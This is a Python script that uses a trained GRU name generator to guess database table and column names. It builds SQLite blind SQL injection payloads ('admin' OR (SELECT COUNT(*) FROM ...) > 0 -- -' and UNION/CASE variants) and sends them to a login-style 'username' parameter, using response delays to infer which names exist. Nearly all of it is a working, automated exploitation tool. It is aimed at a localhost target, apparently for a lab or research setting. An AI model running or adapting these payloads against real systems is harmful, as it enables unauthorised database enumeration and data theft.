import os
import time
import json
import numpy as np
import requests
import tensorflow as tf
from urllib.parse import quote_plus
from typing import List, Tuple

# ================== CONFIG ==================

MODEL_DIR = "trained_models"
MODEL_PATH = os.path.join(MODEL_DIR, "blind_sqli_gru_best.h5")  # Use best model
VOCAB_PATH = os.path.join(MODEL_DIR, "vocab.json")
CONFIG_PATH = os.path.join(MODEL_DIR, "config.json")

# Target configuration
TARGET = "http://127.0.0.1:5000/time"
PARAM = "username"
DELAY_THRESHOLD = 4.0  # Expected delay if SQLi works

# Special tokens
END_TOKEN = '*'
PAD_TOKEN = '<PAD>'
UNK_TOKEN = '<UNK>'

# ================== LOAD MODEL & VOCAB (CORRECT WAY) ==================

def load_model_and_vocab():
    """
    FIX: Load model VÀ vocab đúng cách - dùng file đã save lúc train
    """
    print(f"[+] Loading model from: {MODEL_PATH}")
    print(f"[+] Loading vocab from: {VOCAB_PATH}")
    
    # Check files exist
    if not os.path.exists(MODEL_PATH):
        raise FileNotFoundError(f"Model not found: {MODEL_PATH}")
    if not os.path.exists(VOCAB_PATH):
        raise FileNotFoundError(f"Vocabulary not found: {VOCAB_PATH}")
    if not os.path.exists(CONFIG_PATH):
        raise FileNotFoundError(f"Config not found: {CONFIG_PATH}")
    
    # Load vocabulary (SAME as training)
    with open(VOCAB_PATH, 'r', encoding='utf-8') as f:
        vocab_data = json.load(f)
    
    char2idx = vocab_data['char2idx']
    idx2char = {int(k): v for k, v in vocab_data['idx2char'].items()}
    end_token_idx = vocab_data.get('end_token_idx', char2idx.get(END_TOKEN))
    
    # Load config
    with open(CONFIG_PATH, 'r') as f:
        config = json.load(f)
    
    seq_length = config['seq_length']
    
    print(f"[+] Vocab size: {len(char2idx)}")
    print(f"[+] Sequence length: {seq_length}")
    print(f"[+] END_TOKEN '{END_TOKEN}' index: {end_token_idx}")
    
    # Load model
    try:
        model = tf.keras.models.load_model(MODEL_PATH, compile=False)
        print("[+] Model loaded successfully!")
    except Exception as e:
        raise RuntimeError(f"Failed to load model: {e}")
    
    return model, char2idx, idx2char, seq_length, end_token_idx


# ================== TEXT GENERATION (CORRECT WAY) ==================

def generate_name(
    model,
    char2idx,
    idx2char,
    seq_length,
    end_token_idx,
    seed_text: str = "",
    max_length: int = 20,
    temperature: float = 0.6,
    top_k: int = 5
) -> str:
    """
    FIX: Generate name đúng cách - compatible với training
    
    Args:
        seed_text: Starting text (e.g., "us", "ad", "pa")
                  Empty string = random start
        temperature: 0.5=conservative, 1.0=balanced, 1.5=creative
        top_k: Only sample from top-k predictions (0=disabled)
    """
    # If no seed, pick a random common starting char
    if not seed_text:
        common_starts = ['u', 'a', 'p', 'i', 'd', 'n', 'e', 't', 'c', 's']
        seed_text = np.random.choice(common_starts)
    
    seed_text = seed_text.lower().strip()
    generated = seed_text
    
    for _ in range(max_length):
        # Prepare input sequence (SAME as training)
        x = [char2idx.get(c, 1) for c in generated[-seq_length:]]  # 1 = UNK
        while len(x) < seq_length:
            x.insert(0, 0)  # Pad with PAD_TOKEN
        x = np.array([x])
        
        # Predict
        predictions = model.predict(x, verbose=0)[0]
        
        # Apply temperature
        predictions = np.log(predictions + 1e-10) / temperature
        predictions = np.exp(predictions)
        predictions = predictions / np.sum(predictions)
        
        # Top-k filtering
        if top_k > 0:
            top_indices = np.argpartition(predictions, -top_k)[-top_k:]
            top_probs = predictions[top_indices]
            top_probs = top_probs / np.sum(top_probs)
            predicted_idx = np.random.choice(top_indices, p=top_probs)
        else:
            predicted_idx = np.random.choice(len(predictions), p=predictions)
        
        predicted_char = idx2char[predicted_idx]
        
        # Stop conditions
        if predicted_char == END_TOKEN:
            break
        if predicted_char in ['\n', PAD_TOKEN, UNK_TOKEN]:
            break
        
        generated += predicted_char
    
    # Remove seed if result is just seed
    if len(generated) <= len(seed_text):
        return ""
    
    return generated


def generate_multiple_names(
    model, char2idx, idx2char, seq_length, end_token_idx,
    count: int = 50,
    temperature: float = 0.6
) -> List[str]:
    """
    Generate multiple unique names for fuzzing
    """
    names = set()
    
    # Common seeds for tables/columns
    seeds = [
        'us', 'ad', 'pa', 'id', 'na', 'em', 
        'da', 'lo', 'se', 'pr', 'or', 'cu',
        'ta', 'co', 'in', 'cr', 'up', 'de'
    ]
    
    attempts = 0
    max_attempts = count * 5
    
    while len(names) < count and attempts < max_attempts:
        seed = np.random.choice(seeds)
        name = generate_name(
            model, char2idx, idx2char, seq_length, end_token_idx,
            seed_text=seed,
            max_length=20,
            temperature=temperature
        )
        
        # Validate name
        if name and len(name) > 2 and name not in names:
            # Skip if contains invalid chars
            if not any(c in name for c in ['<', '>', '{', '}', '[', ']']):
                names.add(name)
        
        attempts += 1
    
    return sorted(names)


# ================== PAYLOAD BUILDING ==================

def build_sqlite_time_payload_v1(table_name: str) -> str:
    """
    Version 1: UNION-based detection
    If table exists → returns row → triggers sleep
    """
    payload = (
        f"admin' UNION SELECT 1,'{table_name}','p','r' "
        f"FROM sqlite_master WHERE name='{table_name}' -- -"
    )
    return payload


def build_sqlite_time_payload_v2(table_name: str) -> str:
    """
    Version 2: Boolean-based with CASE
    More reliable time-based detection
    """
    payload = (
        f"admin' OR CASE WHEN (SELECT name FROM sqlite_master "
        f"WHERE type='table' AND name='{table_name}') "
        f"THEN (SELECT COUNT(*) FROM {table_name}) > 0 ELSE 0 END -- -"
    )
    return payload


def build_sqlite_time_payload_v3(table_name: str) -> str:
    """
    Version 3: Direct table access
    Simplest approach - access table directly
    """
    payload = f"admin' OR (SELECT COUNT(*) FROM {table_name}) > 0 -- -"
    return payload


def build_column_payload(table_name: str, column_name: str) -> str:
    """
    Test if column exists in table
    """
    payload = f"admin' OR (SELECT {column_name} FROM {table_name} LIMIT 1) IS NOT NULL -- -"
    return payload


# ================== SEND REQUEST ==================

def send_payload(payload: str, timeout: float = None) -> Tuple[float, bool]:
    """
    Send payload and measure response time
    
    Returns:
        (response_time, timed_out)
    """
    if timeout is None:
        timeout = DELAY_THRESHOLD + 2
    
    try:
        url = f"{TARGET}?{PARAM}={quote_plus(payload)}"
        t1 = time.time()
        response = requests.get(url, timeout=timeout)
        t2 = time.time()
        elapsed = t2 - t1
        return elapsed, False
    except requests.exceptions.Timeout:
        return DELAY_THRESHOLD, True
    except Exception as e:
        print(f"[!] Request error: {e}")
        return 0.0, False


# ================== EXPLOITATION ==================

def test_table_existence(
    model, char2idx, idx2char, seq_length, end_token_idx,
    num_tests: int = 30
):
    """
    Main exploitation function: test table existence using time-based SQLi
    """
    print("\n" + "="*70)
    print("BLIND SQLI EXPLOITATION - TIME-BASED TABLE DETECTION")
    print("="*70)
    print(f"[+] Target: {TARGET}")
    print(f"[+] Delay threshold: {DELAY_THRESHOLD}s")
    print(f"[+] Generating {num_tests} table names using GRU model...")
    
    # Generate candidate table names
    table_names = generate_multiple_names(
        model, char2idx, idx2char, seq_length, end_token_idx,
        count=num_tests,
        temperature=0.6  # Conservative for realistic names
    )
    
    print(f"[+] Generated {len(table_names)} unique table names")
    print(f"[+] Starting exploitation...\n")
    
    found_tables = []
    
    for i, table_name in enumerate(table_names, 1):
        # Build payload - try version 3 (simplest)
        payload = build_sqlite_time_payload_v3(table_name)
        
        # Send request
        elapsed, timed_out = send_payload(payload)
        
        # Check if delay detected
        status = "⏱️  DELAY" if elapsed >= DELAY_THRESHOLD else "✓ Fast"
        print(f"[{i:02d}/{len(table_names)}] {table_name:20s} -> {elapsed:5.2f}s  {status}")
        
        if elapsed >= DELAY_THRESHOLD:
            found_tables.append((table_name, elapsed))
            print(f"    └─> ⚠️  Potential table found: '{table_name}'")
    
    # Summary
    print("\n" + "="*70)
    print("EXPLOITATION SUMMARY")
    print("="*70)
    
    if found_tables:
        print(f"[+] Found {len(found_tables)} potential tables:")
        for table, delay in found_tables:
            print(f"    - {table} (delay: {delay:.2f}s)")
    else:
        print("[!] No tables detected with time delay")
        print("[*] This could mean:")
        print("    1. No generated names match real tables")
        print("    2. Server doesn't have time-based vulnerability")
        print("    3. Need more iterations with different seeds")
    
    return found_tables


def test_columns_for_table(
    model, char2idx, idx2char, seq_length, end_token_idx,
    table_name: str,
    num_tests: int = 20
):
    """
    Once table is found, test for columns
    """
    print(f"\n[*] Testing columns for table: {table_name}")
    
    # Generate column names
    column_names = generate_multiple_names(
        model, char2idx, idx2char, seq_length, end_token_idx,
        count=num_tests,
        temperature=0.6
    )
    
    found_columns = []
    
    for i, column_name in enumerate(column_names, 1):
        payload = build_column_payload(table_name, column_name)
        elapsed, timed_out = send_payload(payload)
        
        status = "⏱️  DELAY" if elapsed >= DELAY_THRESHOLD else "✓ Fast"
        print(f"[{i:02d}/{len(column_names)}] {column_name:20s} -> {elapsed:5.2f}s  {status}")
        
        if elapsed >= DELAY_THRESHOLD:
            found_columns.append(column_name)
    
    return found_columns


# ================== MAIN ==================

def main():
    """
    Main entry point with better organization
    """
    try:
        # Load model and vocabulary
        model, char2idx, idx2char, seq_length, end_token_idx = load_model_and_vocab()
        
        # Test a few generations first
        print("\n[*] Testing text generation (sanity check):")
        test_seeds = ['us', 'ad', 'pa', 'id', 'na']
        for seed in test_seeds:
            name = generate_name(
                model, char2idx, idx2char, seq_length, end_token_idx,
                seed_text=seed,
                temperature=0.6
            )
            print(f"  {seed} -> {name}")
        
        # Wait for user confirmation
        print("\n[?] Generation looks good? Press Enter to start exploitation...")
        input()
        
        # Start exploitation
        found_tables = test_table_existence(
            model, char2idx, idx2char, seq_length, end_token_idx,
            num_tests=30
        )
        
        # If tables found, test columns
        if found_tables:
            print("\n[?] Test columns for found tables? (y/n): ", end="")
            if input().lower() == 'y':
                for table_name, _ in found_tables:
                    columns = test_columns_for_table(
                        model, char2idx, idx2char, seq_length, end_token_idx,
                        table_name=table_name,
                        num_tests=20
                    )
                    if columns:
                        print(f"\n[+] Found columns in {table_name}: {', '.join(columns)}")
        
        print("\n[✓] Exploitation complete!")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[✗] Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()